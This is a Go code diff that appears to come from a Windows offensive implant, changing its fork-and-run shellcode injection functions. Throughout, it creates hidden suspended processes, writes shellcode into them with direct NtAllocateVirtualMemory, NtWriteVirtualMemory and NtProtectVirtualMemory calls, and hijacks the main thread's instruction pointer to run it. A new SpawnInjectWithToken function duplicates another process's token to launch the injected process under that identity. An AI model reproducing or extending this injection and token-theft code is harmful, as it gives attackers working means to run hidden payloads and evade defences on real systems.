@@ -69,36 +69,34 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 	sa.Flags |= windows.STARTF_USESHOWWINDOW
 	sa.ShowWindow = windows.SW_HIDE
 	pi := windows.ProcessInformation{}
+	// inheiriting handles is mandatory for pipes to work
 	err = windows.CreateProcess(nil, notepad, nil, nil, true, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, &sa, &pi)
-	//err = windows.CreateProcess(nil, notepad, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, &sa, &pi)
 	if err != nil {
 		return "", err
 	}
-	log.Printf("Process pid %d\n", pi.ProcessId)
-	windows.CloseHandle(pi.Thread)
 	windows.CloseHandle(windows.Handle(hChildStdoutWrite))
 	windows.CloseHandle(windows.Handle(hChildStdinRead))
 	pidStr := strconv.Itoa(int(pi.ProcessId))
-	hThread, _, err := RemoteInjectReturnThread(shellcode, pidStr)
+	// not creating a new thread just modifying main thread. 	//hThread, _, err := RemoteInjectReturnThread(shellcode, pidStr)
+	threadStart, err := RemoteInjectNoThread(shellcode, pidStr)
 	if err != nil {
 		return "", err
 	}
-	// get thread context
-	/*ctx := winapi.CONTEXT{}
-	ctx.ContextFlags = winapi.CONTEXT_INTEGER
-	err = winapi.GetThreadContext(uintptr(hThread), &ctx)
+	ctx := winapi.CONTEXT{}
+	ctx.ContextFlags = winapi.CONTEXT_CONTROL
+	err = winapi.GetThreadContext(uintptr(pi.Thread), &ctx)
 	if err != nil {
 		return "", err
 	}
-	ctx.Rax = winapi.DWORD64(threadStart)
-	// setting main thread to be our injected code.
-	err = winapi.SetThreadContext(uintptr(hThread), &ctx)
+	ctx.Rip = winapi.DWORD64(threadStart)
+	err = winapi.SetThreadContext(uintptr(pi.Thread), &ctx)
 	if err != nil {
 		return "", err
 	}
-	*/
-	windows.ResumeThread(windows.Handle(hThread))
-	// now we wait for our thread to finish then send a
+	_, err = windows.ResumeThread(windows.Handle(pi.Thread))
+	if err != nil {
+		log.Fatal(err)
+	}
 	var exitCode uint32
 	var STILL_RUNNING uint32 = 259
 	var loops int
@@ -108,7 +106,7 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 				break
 			}
 		}
-		_, err := winapi.GetExitCodeThread(syscall.Handle(hThread), &exitCode)
+		_, err := winapi.GetExitCodeThread(syscall.Handle(pi.Thread), &exitCode)
 		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
 			return "", err
 		}
@@ -134,59 +132,62 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 	return results, nil
 }
 
-/*
-func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
-	cmd := exec.Command(exeToSpawn)
-	cmd.SysProcAttr = new(syscall.SysProcAttr)
-	cmd.SysProcAttr.HideWindow = true
-	stdout, err := cmd.StdoutPipe()
-	stderr, err := cmd.StderrPipe()
+func SpawnInjectWithToken(shellcode []byte, exeToSpawn string, pidStr string) (string, error) {
+	pid, err := strconv.Atoi(pidStr)
 	if err != nil {
 		return "", err
 	}
-	err = cmd.Start()
+	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
 	if err != nil {
 		return "", err
 	}
-	pidStr := strconv.Itoa(cmd.Process.Pid)
-	// now we inject thread and wait on it.
-	hThread, err := RemoteInjectReturnThread(shellcode, pidStr)
+	var hToken windows.Token
+	var duplicatedToken windows.Token
+	err = windows.OpenProcessToken(hProc, windows.TOKEN_IMPERSONATE|windows.TOKEN_DUPLICATE, &hToken)
 	if err != nil {
 		return "", err
 	}
-	log.Println("Confirmed inject thread")
-	// now we wait for our thread to finish then send a
-	var exitCode uint32
-	var STILL_RUNNING uint32 = 259
-	for {
-		_, err := winapi.GetExitCodeThread(syscall.Handle(hThread), &exitCode)
-		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
-			log.Fatalln(err.Error())
-		}
-		if exitCode == STILL_RUNNING {
-			time.Sleep(1000 * time.Millisecond)
-		} else {
-			break
-		}
+	err = windows.DuplicateTokenEx(hToken, windows.MAXIMUM_ALLOWED, nil, 2, windows.TokenImpersonation, &duplicatedToken)
+	if err != nil {
+		return "", err
 	}
-	time.Sleep(10 * time.Second)
-	// kill the process and then read from pipes.
-	cmd.Process.Kill()
-	stderrBuff := bufio.NewScanner(stderr)
-	stdoutBuff := bufio.NewScanner(stdout)
-	var allText []string
-	allText = append(allText, "\n[+] Fork and run completed.\n")
-	for stderrBuff.Scan() {
-		allText = append(allText, stderrBuff.Text())
+	var si windows.StartupInfo
+	var pi windows.ProcessInformation
+	exePtr, err := syscall.UTF16PtrFromString(exeToSpawn)
+	if err != nil {
+		return "", err
 	}
-	for stdoutBuff.Scan() {
-		allText = append(allText, stdoutBuff.Text())
+	res, err := winapi.CreateProcessWithTokenW(syscall.Handle(duplicatedToken), 0x00000002, exePtr, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, uintptr(winapi.NullRef), &si, &pi)
+	if !res {
+		return "", err
 	}
-	allText = append(allText, "\n [+] End of output")
-	completed := strings.Join(allText, "\n")
-	return completed, nil
+	createdPid := strconv.Itoa(int(pi.ProcessId))
+	threadStart, err := RemoteInjectNoThread(shellcode, createdPid)
+	if err != nil {
+		return "", err
+	}
+	ctx := winapi.CONTEXT{}
+	ctx.ContextFlags = winapi.CONTEXT_CONTROL
+	err = winapi.GetThreadContext(uintptr(pi.Thread), &ctx)
+	if err != nil {
+		return "", err
+	}
+	ctx.Rip = winapi.DWORD64(threadStart)
+	err = winapi.SetThreadContext(uintptr(pi.Thread), &ctx)
+	if err != nil {
+		return "", err
+	}
+	_, err = windows.ResumeThread(windows.Handle(pi.Thread))
+	if err != nil {
+		return "", err
+	}
+	windows.ResumeThread(windows.Handle(pi.Thread))
+	go func() {
+		windows.WaitForSingleObject(windows.Handle(pi.Thread), windows.INFINITE)
+		windows.TerminateProcess(pi.Process, 0)
+	}()
+	return fmt.Sprintf("[+] Success Created PID %s", createdPid), nil
 }
-*/
 
 func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
 	arg0, err := syscall.UTF16PtrFromString(exeToSpawn)
@@ -203,32 +204,69 @@ func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
 		return "", err
 	}
 	pidStr := strconv.Itoa(int(pi.ProcessId))
-	hThread, threadStart, err := RemoteInjectReturnThread(shellcode, pidStr)
+	threadStart, err := RemoteInjectNoThread(shellcode, pidStr)
 	if err != nil {
 		return "", err
 	}
-	// get thread context
 	ctx := winapi.CONTEXT{}
-	ctx.ContextFlags = winapi.CONTEXT_INTEGER
-	err = winapi.GetThreadContext(uintptr(hThread), &ctx)
+	ctx.ContextFlags = winapi.CONTEXT_CONTROL
+	err = winapi.GetThreadContext(uintptr(pi.Thread), &ctx)
 	if err != nil {
 		return "", err
 	}
-	ctx.Rax = winapi.DWORD64(threadStart)
-	// setting main thread to be our injected code.
-	err = winapi.SetThreadContext(uintptr(hThread), &ctx)
+	ctx.Rip = winapi.DWORD64(threadStart)
+	err = winapi.SetThreadContext(uintptr(pi.Thread), &ctx)
 	if err != nil {
 		return "", err
 	}
-	windows.ResumeThread(windows.Handle(hThread))
+	_, err = windows.ResumeThread(windows.Handle(pi.Thread))
+	if err != nil {
+		return "", err
+	}
+	windows.ResumeThread(windows.Handle(pi.Thread))
+	windows.CloseHandle(pi.Process)
 	go func() {
-		// wait for our code to finish then resume main thread so process continues normally.
-		windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
-		windows.ResumeThread(pi.Thread)
-		windows.CloseHandle(pi.Thread)
-		windows.CloseHandle(pi.Process)
+		windows.WaitForSingleObject(windows.Handle(pi.Thread), windows.INFINITE)
+		windows.TerminateProcess(pi.Process, 0)
 	}()
 	return fmt.Sprintf("[+] Success Created PID %s", pidStr), nil
+}
+
+func RemoteInjectNoThread(shellcode []byte, pid string) (uintptr, error) {
+	var rights uint32 = windows.PROCESS_CREATE_THREAD |
+		windows.PROCESS_QUERY_INFORMATION |
+		windows.PROCESS_VM_OPERATION |
+		windows.PROCESS_VM_WRITE |
+		windows.PROCESS_VM_READ
+	intpid, err := strconv.Atoi(pid)
+	if err != nil {
+		return 0, err
+	}
+	procHandle, err := rawapi.NtOpenProcess(uint32(intpid), rights)
+	if procHandle == 0 {
+		return 0, err
+	}
+	var flProtect uint32 = windows.PAGE_READWRITE
+	var newFlProtect uint32 = windows.PAGE_EXECUTE_READ
+	var shellcodelen uintptr = uintptr(len(shellcode))
+	var lpBaseAddress uintptr = 0
+	var lens uint64 = uint64(len(shellcode))
+	lpBaseAddress, err = rawapi.NtAllocateVirtualMemory(procHandle, lpBaseAddress, 0, lens, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil || lpBaseAddress == 0 {
+		return 0, err
+	}
+	var nBytesWritten *uint32
+	err = rawapi.NtWriteVirtualMemory(uintptr(procHandle), lpBaseAddress, uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(lens), nBytesWritten)
+	if err != nil {
+		windows.CloseHandle(windows.Handle(procHandle))
+		return 0, err
+	}
+	err = rawapi.NtProtectVirtualMemory(uintptr(procHandle), lpBaseAddress, &shellcodelen, newFlProtect, &flProtect)
+	if err != nil {
+		windows.CloseHandle(windows.Handle(procHandle))
+		return 0, err
+	}
+	return lpBaseAddress, nil
 }
 
 func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, uintptr, error) {
